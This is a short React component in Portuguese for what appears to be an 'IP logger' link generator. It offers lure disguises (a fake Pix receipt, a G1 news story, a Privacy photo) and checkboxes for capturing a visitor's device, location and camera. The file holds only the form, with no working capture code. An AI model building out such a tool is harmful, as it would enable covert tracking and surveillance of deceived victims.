

export function CreateIpLoggerComponent() {
    return (
        <>
            <select>
                <option>
                    Comprovante de Pix
                </option>
                <option>
                    Notícia do G1
                </option>
                <option>
                    Foto do Privacy
                </option>
            </select>
            <div className="checkbox-data">
                <label>Dados a serem capturados:</label>
                <ul>
                    <li>
                        <input type="checkbox" id="device" name="device" value="ip" />
                        <label>Dispositivo Utilizado</label>
                    </li>
                    <li>
                        <input type="checkbox" id="location" name="location" value="ip" />
                        <label>Localização</label>
                    </li>
                    <li>
                        <input type="checkbox" id="picture" name="picture" value="ip" />
                        <label>Câmera</label>
                    </li>
                </ul>
            </div>
        </>
    );
}